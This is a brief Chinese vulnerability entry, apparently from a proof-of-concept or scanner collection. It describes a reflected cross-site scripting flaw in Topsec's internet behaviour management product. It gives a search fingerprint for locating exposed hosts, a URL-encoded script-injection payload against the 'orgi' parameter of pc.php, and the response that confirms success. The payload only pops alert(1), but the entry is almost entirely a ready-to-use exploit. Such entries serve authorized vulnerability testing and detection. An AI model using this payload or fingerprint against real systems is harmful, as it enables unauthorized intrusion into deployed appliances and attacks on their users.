# 天融信上网行为管理PC存在跨站脚本漏洞

天融信上网行为管理 ｜ XSS ｜ —
- **指纹**：`body="ActiveXObject"`

**Payload**
```
/smsauth/adverdeclare/pc.php?orgi=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```
- **响应特征**：200 alert(1)